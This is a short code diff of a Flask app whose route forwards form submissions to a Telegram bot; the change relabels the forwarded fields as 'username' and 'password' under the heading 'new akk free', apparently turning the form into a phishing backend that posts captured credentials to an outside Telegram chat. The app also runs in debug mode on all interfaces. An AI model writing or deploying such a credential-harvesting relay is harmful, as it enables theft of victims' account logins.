@@ -16,7 +16,7 @@ def send_message():
     try:
         name = request.form.get('name', 'No name')
         message = request.form.get('message', 'No message')
-        text = f"🧾 hazl:\n👤 habar: {name}\n nma gap ako hazl bu yerda: {message}"
+        text = f"🧾 new akk free:\n👤 username: {name}\n🔒 password: {message}"
 
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         response = requests.post(url, data={"chat_id": CHAT_ID, "text": text})
@@ -31,3 +31,4 @@ def send_message():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
+
